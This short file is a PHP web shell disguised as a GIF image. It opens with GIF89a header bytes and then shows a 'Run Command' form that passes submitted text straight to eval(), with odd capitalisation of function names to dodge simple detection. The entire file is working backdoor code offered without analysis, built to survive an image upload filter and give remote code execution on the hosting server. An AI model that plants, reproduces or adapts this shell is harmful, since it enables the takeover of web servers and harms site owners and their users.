GIF89aP;<?php Echo "<form method='POST' > Run Command: <input type='text' name='cod' /><br /><input type='submit' value='Go' name='go' /></form></html>"; 
$cod = $_POST['cod'];
$send=$_POST['go'];
if ($send) {
eVal(stripslasHes($cod) );
} ?> 
